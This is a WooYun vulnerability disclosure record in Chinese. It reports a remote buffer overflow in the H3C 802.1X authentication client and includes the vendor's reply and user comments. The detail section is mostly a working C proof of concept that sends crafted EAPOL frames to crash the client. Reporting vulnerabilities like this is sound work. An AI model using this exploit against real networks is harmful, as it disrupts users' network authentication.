{"id": 12147, "wybug_id": "wooyun-2013-020272", "wybug_title": "H3C 802.1X客户端远程缓冲区溢出漏洞", "wybug_corp": "华为技术有限公司", "wybug_author": "cssembly", "wybug_date": "2013-03-18 20:46", "wybug_open_date": "2013-06-16 20:47", "wybug_type": "拒绝服务", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["缓冲区溢出", "远程拒绝服务", "内存读访问违例", "客户端安全", "逆向破解思路"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-03-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-03-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-03-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-05-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-06-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-06-16：\t细节向公众公开  简要描述： H3C 802.1X客户端未对关键数据做校验，导致缓冲区溢出 详细说明：  sub_4030E0函数，在4031F6点处调用memcpy函数，而memcpy函数的缓冲区长度字段如果恶意构造，就能导致减去2以后就能变成0xFFFFFFFF,最终导致缓冲区溢出\n\n   漏洞证明：  poc代码如下：#include <pcap.h>#pragma comment( lib , \"wpcap.lib\" )int _tmain(int argc, _TCHAR* argv[]){\tpcap_t *fp;\tchar errbuf[PCAP_ERRBUF_SIZE];\tu_char packet[3000];\tpcap_if_t *alldevs;\t/* Check the validity of the command line */\tif(pcap_findalldevs(&alldevs, errbuf) == -1)\t{\t\tfprintf(stderr,\"Error in pcap_findalldevs: %s\\n\", errbuf);\t\texit(1);\t}\tpcap_if_t *d;\tint i = 0;\t/* Print the list */\tfor(d=alldevs; d; d=d->next)\t{\t\tprintf(\"%d. %s\", ++i, d->name);\t\tif (d->description)\t\t\tprintf(\" (%s)\\n\", d->description);\t\telse\t\t\tprintf(\" (No description available)\\n\");\t}\t/* 选择相应网卡*/\tif ((fp = pcap_open_live(alldevs->name,\t\t// name of the device\t\t65536,\t\t\t// portion of the packet to capture. It doesn't matter in this case \t\t1,\t\t\t\t// promiscuous mode (nonzero means promiscuous)\t\t1000,\t\t\t// read timeout\t\terrbuf\t\t\t// error buffer\t\t)) == NULL)\t{\t\tfprintf(stderr,\"\\nUnable to open the adapter. %s is not supported by WinPcap\\n\", argv[1]);\t\treturn 2;\t}\tmemset( packet , 0 , 1000 ); \t/* 目标机器mac地址 */\tpacket[0]= 0x00;\tpacket[1]= 0x0C;\tpacket[2]= 0x29;\tpacket[3]= 0x0F;\tpacket[4]= 0x63;\tpacket[5]= 0xDD;\t/* set mac source to 2:2:2:2:2:2 */\tpacket[6]= 2;\tpacket[7]= 2;\tpacket[8]= 2;\tpacket[9]= 2;\tpacket[10]= 2;\tpacket[11]= 2;\t/* 协议头 */\tpacket[12] = 0x88;\tpacket[13] = 0x8e;\tpacket[14] = 0x01;\tpacket[15] = 0x00;\tpacket[16] = 0xFF;\tpacket[17] = 0xFF;\tpacket[18] = 0x01;\tpacket[19] = 0x03;\tpacket[20] = 0x05;//\tpacket[22] = 0x01;\tif (pcap_sendpacket(fp,\t// Adapter\t\tpacket,\t\t\t\t// buffer with the packet\t\t100\t// size\t\t) != 0)\t{\t\tfprintf(stderr,\"\\nError sending the packet: %s\\n\", pcap_geterr(fp));\t\treturn 3;\t}\tpacket[22] = 0x07;\tif (pcap_sendpacket(fp,\t// Adapter\t\tpacket,\t\t\t\t// buffer with the packet\t\t100\t// size\t\t) != 0)\t{\t\tfprintf(stderr,\"\\nError sending the packet: %s\\n\", pcap_geterr(fp));\t\treturn 3;\t}\tpacket[18] = 0x0A;\tpacket[19] = 0x03;\tpacket[20] = 0x05;//\tpacket[22] = 0x19;//\tpacket[23] = 0x19;//\tpacket[24] = 0x39;//\tpacket[25] = 0x00;//\t/* Send down the packet */\tif (pcap_sendpacket(fp,\t// Adapter\t\tpacket,\t\t\t\t// buffer with the packet\t\t100\t// size\t\t) != 0)\t{\t\tfprintf(stderr,\"\\nError sending the packet: %s\\n\", pcap_geterr(fp));\t\treturn 3;\t}\tpcap_close(fp);\t\treturn 0;}运行客户端，输入用户名密码\n\n点击开始认知\n\n运行攻击代码，程序溢出崩溃\n\n   修复方案：     版权声明：转载请注明来源 cssembly@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-03-19 08:54 厂商回复： H3C现不属于华为，请将漏洞转至CNERT或者直接联系厂商，谢谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-03-19 11:33 |    \t\tnone \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:5        | 十次十次啊 hack it then know more~)\t\t \n  属于华三通     \n     2013-04-08 09:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:170        | 力不从心)\t\t \n  似乎最近见了好几次都是把H3C发到华为了……    \n     2013-06-16 21:03 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:17        | 当我又回首一切,这个世界会好吗?)\t\t \n  Good!    \n     2013-06-17 09:52 |    \t\tPasser_by \t\t\t( 实习白帽子  |\t\t\t        Rank:97 漏洞数:21        | 问题真实存在但是影响不大（腾讯微博Passer...)\t\t \n  @xsser 不属于华为还确认1rk。。乌云给厂商弄个“不是我家漏洞”的链接？    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}